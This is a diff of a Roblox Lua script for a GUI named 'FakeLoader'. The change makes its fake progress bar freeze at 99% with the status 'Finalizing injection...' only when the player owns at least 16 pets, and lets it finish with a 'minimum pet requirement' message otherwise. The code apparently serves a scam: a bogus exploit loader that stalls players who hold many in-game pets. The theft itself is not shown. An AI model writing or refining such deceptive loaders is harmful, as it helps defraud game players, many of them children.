@@ -4,7 +4,7 @@ local player = game.Players.LocalPlayer
 local gui = Instance.new("ScreenGui")
 gui.Name = "FakeLoader"
 gui.ResetOnSpawn = true
-gui.Parent = player:WaitForChild("PlayerGui") -- show on this player's screen only
+gui.Parent = player:WaitForChild("PlayerGui")
 
 -- container
 local container = Instance.new("Frame")
@@ -106,9 +106,22 @@ end
 
 typeText(messages[1])
 
+-- check pets count
+local petsFolder = player:WaitForChild("BackpackApp")
+	:WaitForChild("Frame")
+	:WaitForChild("ScrollComplex")
+	:WaitForChild("ScrollingFrame")
+	:WaitForChild("Content")
+	:WaitForChild("pets")
+
+local totalChildren = 0
+for _, row in ipairs(petsFolder:GetChildren()) do
+	totalChildren += #row:GetChildren()
+end
+
 -- loader animation
 task.spawn(function()
-	while progress < 99 do
+	while progress < 99 or (totalChildren < 16 and progress < 100) do
 		-- speed changes depending on percent
 		local speed = 0.06
 		if progress > 30 then speed = 0.045 end
@@ -117,7 +130,13 @@ task.spawn(function()
 		if progress > 95 then speed = 0.01 end
 
 		progress += speed
-		progress = math.min(progress, 99) -- never above 99
+
+		-- freeze at 99 if 16+ pets
+		if totalChildren >= 16 then
+			progress = math.min(progress, 99)
+		else
+			progress = math.min(progress, 100)
+		end
 
 		percent.Text = math.floor(progress).."%"
 		fill.Size = UDim2.new(progress/100,0,1,0)
@@ -133,7 +152,11 @@ task.spawn(function()
 		task.wait(0.05)
 	end
 
-	status.Text = "Finalizing injection..."
+	if totalChildren < 16 then
+		status.Text = "Minimum pet requirement not achieved"
+	else
+		status.Text = "Finalizing injection..."
+	end
 end)
 
 -- gradient movement (simulate glow animation)
